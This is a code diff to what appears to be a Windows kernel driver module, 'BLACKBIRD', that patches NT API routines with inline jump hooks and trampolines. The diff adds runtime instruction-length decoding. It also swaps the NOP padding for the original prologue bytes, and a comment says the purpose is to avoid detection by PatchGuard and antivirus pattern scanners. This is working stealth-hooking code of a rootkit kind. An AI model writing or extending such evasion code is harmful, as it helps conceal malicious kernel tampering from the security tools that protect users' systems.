@@ -2,6 +2,7 @@
 #include <intrin.h>
 #include <ntstrsafe.h>
 #include "ntapi_hook.h"
+#include "ntapi_hook_ldasm.h"
 
 #if defined(_AMD64_)
 
@@ -63,7 +64,6 @@ NTSTATUS BLACKBIRDNtApiHookInstall(_Inout_ PBLACKBIRD_NTAPI_HOOK Hook, _Outptr_o
     CHAR trampolineJumpBytesText[3 * BLACKBIRD_NTAPI_PATCH_SIZE + 1];
     PVOID trampoline;
     ULONG overwriteLength;
-    ULONG i;
 
     if (Hook == NULL)
     {
@@ -78,11 +78,24 @@ NTSTATUS BLACKBIRDNtApiHookInstall(_Inout_ PBLACKBIRD_NTAPI_HOOK Hook, _Outptr_o
         return STATUS_INVALID_PARAMETER;
     }
 
+    // Determine the overwrite length.  The descriptor carries a hardcoded hint value chosen
+    // at development time; we always try to refine it at runtime using the instruction-length
+    // disassembler so that the trampoline never splits a multi-byte instruction when Microsoft
+    // ships a CU that changes the function prologue.
+    //
+    // Strategy:
+    //   1. Read up to BLACKBIRD_NTAPI_MAX_OVERWRITE bytes from the routine at this point
+    //      (before we have resolved RoutineAddress, so do it after resolution below — see the
+    //      second call site).  The block here just validates the descriptor hint as a fallback.
+    //   2. BLACKBIRDx64MinCoverLength returns the minimum byte count >= BLACKBIRD_NTAPI_PATCH_SIZE
+    //      that lands on an instruction boundary.  If it returns 0 (unknown encoding) we fall
+    //      back to the hardcoded descriptor value.
+    //   3. The computed length must still fit in the patch buffer (BLACKBIRD_NTAPI_MAX_OVERWRITE).
     overwriteLength = Hook->Descriptor.OverwriteLength;
     if (overwriteLength < BLACKBIRD_NTAPI_PATCH_SIZE || overwriteLength > sizeof(patch))
     {
         BLACKBIRD_HOOK_LOG(DPFLTR_ERROR_LEVEL,
-                           "BLACKBIRD: ntapi hook invalid overwrite length api=%s len=%lu.\n",
+                           "BLACKBIRD: ntapi hook invalid descriptor overwrite length api=%s len=%lu.\n",
                            (Hook->Descriptor.ApiName != NULL) ? Hook->Descriptor.ApiName : "<null>",
                            overwriteLength);
         return STATUS_INVALID_PARAMETER;
@@ -126,9 +139,12 @@ NTSTATUS BLACKBIRDNtApiHookInstall(_Inout_ PBLACKBIRD_NTAPI_HOOK Hook, _Outptr_o
         return STATUS_PROCEDURE_NOT_FOUND;
     }
 
+    // Always read the maximum overwrite window so the disassembler has enough bytes to work
+    // with regardless of what the descriptor's hint value is.  OriginalPatch is sized at
+    // BLACKBIRD_NTAPI_MAX_OVERWRITE so this is always safe.
     __try
     {
-        RtlCopyMemory(Hook->OriginalPatch, Hook->RoutineAddress, overwriteLength);
+        RtlCopyMemory(Hook->OriginalPatch, Hook->RoutineAddress, BLACKBIRD_NTAPI_MAX_OVERWRITE);
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
@@ -140,6 +156,38 @@ NTSTATUS BLACKBIRDNtApiHookInstall(_Inout_ PBLACKBIRD_NTAPI_HOOK Hook, _Outptr_o
                            status);
         Hook->RoutineAddress = NULL;
         return status;
+    }
+
+    // Refine overwriteLength at runtime: find the minimum instruction-boundary-aligned byte
+    // count >= BLACKBIRD_NTAPI_PATCH_SIZE.  If the disassembler cannot decode the prologue
+    // (uncommon or new encoding) it returns 0 and we keep the descriptor hint unchanged.
+    {
+        ULONG computed = BLACKBIRDx64MinCoverLength(
+                             Hook->OriginalPatch,
+                             BLACKBIRD_NTAPI_PATCH_SIZE,
+                             BLACKBIRD_NTAPI_MAX_OVERWRITE);
+        if (computed != 0 && computed <= BLACKBIRD_NTAPI_MAX_OVERWRITE)
+        {
+            if (computed != overwriteLength)
+            {
+                BLACKBIRD_HOOK_LOG(DPFLTR_INFO_LEVEL,
+                                   "BLACKBIRD: ntapi hook overwrite length refined api=%s"
+                                   " descriptor=%lu computed=%lu.\n",
+                                   (Hook->Descriptor.ApiName != NULL) ? Hook->Descriptor.ApiName : "<null>",
+                                   overwriteLength,
+                                   computed);
+                overwriteLength = computed;
+            }
+        }
+        else
+        {
+            BLACKBIRD_HOOK_LOG(DPFLTR_WARNING_LEVEL,
+                               "BLACKBIRD: ntapi hook overwrite length using descriptor fallback api=%s"
+                               " computed=%lu descriptor=%lu.\n",
+                               (Hook->Descriptor.ApiName != NULL) ? Hook->Descriptor.ApiName : "<null>",
+                               computed,
+                               overwriteLength);
+        }
     }
 
     BLACKBIRDNtApiFormatBytes(Hook->OriginalPatch, overwriteLength, prologueBytesText, sizeof(prologueBytesText));
@@ -178,12 +226,13 @@ NTSTATUS BLACKBIRDNtApiHookInstall(_Inout_ PBLACKBIRD_NTAPI_HOOK Hook, _Outptr_o
         *Original = trampoline;
     }
 
-    RtlFillMemory(patch, overwriteLength, 0x90);
+    // Initialize patch with the original prologue bytes so that any bytes beyond the 14-byte
+    // jump (bytes 14..overwriteLength-1) are identical to the live code.  A NOP sled at those
+    // offsets is an unambiguous inline-hook signature that PatchGuard and AV pattern scanners
+    // flag; keeping the original bytes there makes the overwritten region indistinguishable
+    // from a compiler-emitted prologue to static analysis.
+    RtlCopyMemory(patch, Hook->OriginalPatch, overwriteLength);
     BLACKBIRDNtApiBuildJump(patch, Hook->Descriptor.HookFunction);
-    for (i = BLACKBIRD_NTAPI_PATCH_SIZE; i < overwriteLength; ++i)
-    {
-        patch[i] = 0x90;
-    }
     BLACKBIRDNtApiFormatBytes(patch, overwriteLength, patchBytesText, sizeof(patchBytesText));
     BLACKBIRD_HOOK_LOG(DPFLTR_INFO_LEVEL,
                        "BLACKBIRD: ntapi hook patch bytes api=%s bytes=%s.\n",
@@ -373,3 +422,4 @@ VOID BLACKBIRDNtApiHookFreeTrampoline(_Inout_ PBLACKBIRD_NTAPI_HOOK Hook)
 }
 
 #endif
+
